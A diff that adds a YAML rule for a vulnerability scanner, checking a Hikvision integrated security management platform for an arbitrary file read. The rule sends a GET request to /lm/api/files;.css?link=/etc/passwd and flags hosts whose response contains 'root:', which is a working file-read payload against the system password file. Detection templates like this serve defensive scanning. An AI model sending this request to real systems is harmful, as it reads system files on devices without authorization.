@@ -1,0 +1,11 @@
+name: HIKVISION-综合安防管理平台-files文件读取
+description: >
+  读取文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /lm/api/files;.css?link=/etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"] 
